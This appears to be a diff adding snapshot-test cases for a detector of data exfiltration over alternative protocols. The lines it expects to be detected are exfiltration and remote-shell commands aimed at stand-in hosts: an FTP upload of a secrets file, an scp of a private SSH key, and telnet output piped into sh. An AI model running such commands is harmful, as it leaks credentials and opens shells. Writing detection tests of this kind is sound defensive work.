@@ -1,0 +1,13 @@
+# EX-006: Alternative protocol exfiltration
+# Test cases for snapshot testing
+
+# === Cases that SHOULD be detected ===
+curl -T secret.txt ftp://evil.com/upload
+scp ~/.ssh/id_rsa $USER@attacker.com:/data
+socat - TCP:evil.com:4444
+telnet evil.com 25 | sh
+
+# === Cases that should NOT be detected ===
+scp file.txt localhost:/tmp
+socat - TCP:127.0.0.1:8080
+curl -T file.txt ftp://localhost/upload
